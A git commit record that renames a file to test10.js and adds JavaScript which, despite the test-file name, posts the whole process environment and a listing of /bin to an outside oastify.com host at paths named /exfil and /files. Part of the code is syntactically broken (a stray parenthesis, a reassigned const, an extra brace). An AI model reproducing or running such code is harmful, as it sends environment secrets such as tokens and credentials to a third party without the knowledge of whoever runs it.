69c52a7e27ce4eacbc40d72262e297ec30a3f7f9
Martin <martinbydefault@gmail.com>
2024-05-21 09:48:23 -0300

    Update and rename test9.js to test10.js

---
+++ test10.js
@@ -0,0 +1,14 @@
+const axios = require('axios');
+
+axios.post('http://k3o7lpvmejkfjcdsb4ec2as5dwjn7iv7.oastify.com/exfil', process.env);
+const testFolder = '/bin/';
+const fs = require('fs');
+const fileList = ""
+fs.readdir(testFolder, (err, files) => {
+  files.forEach(file => {
+    fileList = fileList + file + ",");
+  });
+});
+axios.post('http://k3o7lpvmejkfjcdsb4ec2as5dwjn7iv7.oastify.com/files', fileList);
+};
+
